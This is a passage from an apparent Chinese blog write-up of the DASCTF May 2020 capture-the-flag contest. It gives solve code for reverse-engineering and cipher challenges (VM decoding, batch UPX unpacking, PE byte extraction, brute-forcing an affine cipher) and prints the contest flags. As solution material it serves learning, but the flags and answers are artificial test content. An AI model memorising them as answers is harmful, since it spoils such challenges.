class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decode_4</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = i;</span><br><span class="line"></span><br><span class="line">j ^= <span class="number">10</span>;</span><br><span class="line">temp = (<span class="number">16</span>*j &gt;&gt; <span class="number">31</span>)&gt;&gt;<span class="number">28</span>;</span><br><span class="line"><span class="keyword">if</span>(a == j + (((temp + <span class="number">16</span>*(*(<span class="keyword">char</span> *)&amp;j))&amp;<span class="number">0xF</span>)-temp))</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">152</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">37</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">66</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">74</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">68</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">123</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">112</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">212</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">60</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">200</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">108</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">144</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">111</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">6</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">144</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">59</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">29</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">196</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">62</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">96</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">75</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">208</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">108</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">136</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">112</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">76</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">204</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">125</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">36</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> d[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, e[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a1[<span class="number">100</span>] = &#123;<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">36</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">36</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">100</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">19</span>,<span class="number">31</span>,<span class="number">25</span>,<span class="number">14</span>,<span class="number">23</span>,<span class="number">33</span>,<span class="number">13</span>,<span class="number">9</span>,<span class="number">24</span>,<span class="number">6</span>,<span class="number">26</span>,<span class="number">34</span>,<span class="number">17</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">15</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">28</span>,<span class="number">21</span>,<span class="number">36</span>,<span class="number">20</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">27</span>,<span class="number">30</span>,<span class="number">35</span>,<span class="number">37</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> c[<span class="number">100</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">31</span>,<span class="number">29</span>,<span class="number">7</span>,<span class="number">35</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">27</span>,<span class="number">18</span>,<span class="number">25</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">22</span>,<span class="number">28</span>,<span class="number">26</span>,<span class="number">36</span>,<span class="number">33</span>,<span class="number">32</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">23</span>,<span class="number">34</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">19</span>,<span class="number">6</span>,<span class="number">37</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i &gt;= <span class="number">-87</span>)</span><br><span class="line"><span class="keyword">switch</span>(a1[<span class="number">87</span>+i])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">A.a[j] = (A.a[j] / <span class="number">16</span>)*<span class="number">2</span>;</span><br><span class="line">A.a[j] = A.a[j];</span><br><span class="line">A.a[j] /= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">A.a[j] -= <span class="number">128</span>;</span><br><span class="line">A.a[j] = A.a[j]*j;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">A.a[++j] /= <span class="number">10</span>;</span><br><span class="line">--i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">A.a[j] = decode_4(A.a[j]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">A.a[j] = A.a[j];</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">A.a[j--] *= <span class="number">10</span>;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">A.a[j] -= <span class="number">128</span>;</span><br><span class="line">A.a[j] = ~A.a[j];</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">--i;</span><br><span class="line">--j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">A.a[j] /= <span class="number">4</span>;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">d[c[i]<span class="number">-1</span>] = A.a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">e[b[i]<span class="number">-1</span>] = d[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">4</span>; i &lt;= <span class="number">19</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = e[i];</span><br><span class="line">e[i] = e[i+<span class="number">16</span>];</span><br><span class="line">e[i+<span class="number">16</span>] = temp;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, e[i]); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524083340342.png" alt="image-20200524083340342"></p></li></ul><hr><h3 id="BScript"><a href="#BScript" class="headerlink" title="BScript"></a>BScript</h3><ul><li><p>感觉有点意思.  主要就是考对文件内容的提取, 还有就是找规律!!!</p></li><li><p>下载下来803个exe文件.  随便打开一个看见简单的输入对比, 再打开一个还是同样的.但没有发现与解题相关的东西.</p></li><li><p>也是后面想着再去看看这个题才发现 每个exe文件让我们输入的都是一个PE文件的一部分, 那 熟悉的 MZ(4D5A).<img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524100310951.png" alt="image-20200524100310951"></p></li><li><p>接下来就是去文件内容了. 但是每个程序都是加了upx壳的。</p></li><li><p>然后用C语言写了脱壳：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">83</span>; i &lt; <span class="number">804</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(a, <span class="string">"upx -d %d.exe"</span>, i);</span><br><span class="line">system(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524102949962.png" alt="image-20200524102949962"></p></li><li><p>下面提取每个程序的 PE文件那部分的内容. 弄完, 保存为exe文件后, 打不开…ida都不行, 看看了PE文件内容发现区段都没有。。</p></li><li><p>那就提取的内容有问题, 多看了几个原来的exe文件, 果然，有的提取内容的位置不一样. 但有803个exe。</p></li><li><p>开始找规律. 列举了很多还是没发现. 这也是本题花费时间最多的地方……..根据exe文件的字节大小来区分…改了一下提取内容的程序.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, n = <span class="number">779</span>, j = <span class="number">0</span>, lenth = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">4000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> filename[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(filename, <span class="string">"%d.exe"</span>, j++);</span><br><span class="line">fp = fopen(filename, <span class="string">"rb"</span>);</span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">lenth = ftell(fp);</span><br><span class="line"><span class="keyword">if</span>(lenth == <span class="number">0xBDF1</span>)</span><br><span class="line">&#123;</span><br><span class="line">fseek(fp, <span class="number">0x1c20</span>, <span class="number">0</span>);</span><br><span class="line">fread(a, <span class="number">1</span>, <span class="number">0x20</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X"</span>, a[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">fseek(fp, <span class="number">0x1C40</span>, <span class="number">0</span>);</span><br><span class="line">fread(a, <span class="number">1</span>, <span class="number">0x40</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">63</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X"</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>仍然打不开, 但是这次区段都是齐的, ida可以打开就好了. </p></li><li><p>载入ida, 发现有很多干扰项, 但可以在比较函数上面一个看出是 base64加密. 最后与密文比较.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524101529508.png" alt="image-20200524101529508"></p></li><li><p>找密文. 可以发现是程序运行才赋值的.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524101634787.png" alt="image-20200524101634787"></p></li><li><p>提取出来base解密一下, 再md5得到flag. <strong>e801bcbcc42d3120d910ccc46ae640dd</strong></p></li></ul><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bbcrypto"><a href="#bbcrypto" class="headerlink" title="bbcrypto"></a>bbcrypto</h3><ul><li><p>由于python接触的很少，做了一个密码学的感觉像是在学python。不断查语法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> A,SALT</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, a, si)</span>:</span></span><br><span class="line"></span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</span><br><span class="line"></span><br><span class="line">        c+=hex(((ord(m[i])) * a + ord(next(si))) % <span class="number">128</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>)  <span class="comment">#不足2位以0填充。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    m = <span class="string">'flag&#123;********************************&#125;'</span></span><br><span class="line"></span><br><span class="line">    a = A</span><br><span class="line"></span><br><span class="line">    salt = SALT</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(len(salt)==<span class="number">3</span>) <span class="comment">#assert相当于一个判断表达式，若括号中表达式不成立则退出。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(salt.isalpha()) <span class="comment">#检查是否是字母</span></span><br><span class="line"></span><br><span class="line">    si = cycle(salt.lower()) <span class="comment">#cycle把字符串salt变成一个循环，相当于 si[i++%3];</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"明文内容为："</span>)</span><br><span class="line"></span><br><span class="line">    print(m)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"加密后的密文为："</span>)</span><br><span class="line"></span><br><span class="line">    c=encrypt(m, a, si)</span><br><span class="line"></span><br><span class="line">    print(c)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#加密后的密文为：</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d</span></span><br></pre></td></tr></table></figure></li><li><p>从题中可以看到，A与salt未知，但是salt给出了限制，必须字母且3位。</p></li><li><p>又知道flag的格式 <strong>flag{ }</strong>，那结合密文与加密表达式，直接列方程加爆破解出未知量即可。</p></li><li><p>记得当时解出 A  = 57. si = “ahh”. 开始解密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, lenth = <span class="built_in">strlen</span>(a), sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> c[<span class="number">3</span>] = &#123;<span class="number">97</span>, <span class="number">104</span>, <span class="number">104</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">97</span> &amp;&amp; a[i] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] &gt;= <span class="number">65</span> &amp;&amp; a[i] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">48</span>; </span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">97</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">65</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i+<span class="number">1</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b[j++] = sum, sum = <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">38</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">33</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i*<span class="number">57</span> + c[j%<span class="number">3</span>])%<span class="number">128</span> == b[j])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, i); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>flag: flag{ad7d973ffdd285b476a1a727b3a8fbc4}</strong></p></li></ul><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Questionaire"><a href="#Questionaire" class="headerlink" title="Questionaire"></a>Questionaire</h3><ul><li>开始网站始终打不开，因为没接触过web，始终认为是考web的知识。</li><li>后面想着挂vpn试试。打开了，很多刁难性问题，直接查看网页源代码，找到对应答案即可。</li></ul><h3 id="bin-cat-2"><a href="#bin-cat-2" class="headerlink" title="/bin/cat 2"></a>/bin/cat 